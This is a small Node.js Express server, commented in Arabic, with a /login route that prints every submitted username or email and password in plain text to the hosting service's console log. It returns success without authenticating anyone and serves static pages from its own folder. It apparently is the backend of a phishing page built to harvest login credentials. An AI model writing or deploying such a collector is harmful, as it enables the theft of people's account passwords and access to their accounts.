const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// هذا المسار يستقبل البيانات ويعرضها في لوحة تحكم Render
app.post('/login', (req, res) => {
    console.log("=== بيانات تسجيل دخول جديدة ===");
    console.log("الحساب أو الإيميل:", req.body.user);
    console.log("كلمة السر (Password):", req.body.pass);
    console.log("===============================");
    res.sendStatus(200); // إرسال إشارة نجاح للواجهة
});

// تشغيل السيرفر على المنفذ المناسب للاستضافة
app.listen(process.env.PORT || 3000, () => {
    console.log("السيرفر يعمل بنجاح ومستعد لاستقبال البيانات...");
});